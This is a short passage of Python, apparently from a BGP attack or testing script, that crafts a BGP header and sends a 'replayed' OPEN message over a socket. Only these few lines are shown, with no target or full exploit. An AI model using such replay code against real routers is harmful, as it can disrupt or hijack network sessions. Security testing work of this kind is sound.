    # Craft BGP header for the OPEN message
    header = craft_bgp_header(BGP_MSG_OPEN, len(open_msg))
    full_msg = header + open_msg
    
    print(f"[*] Sending replayed OPEN message...")
    sock.sendall(full_msg)
    
    # Wait for response
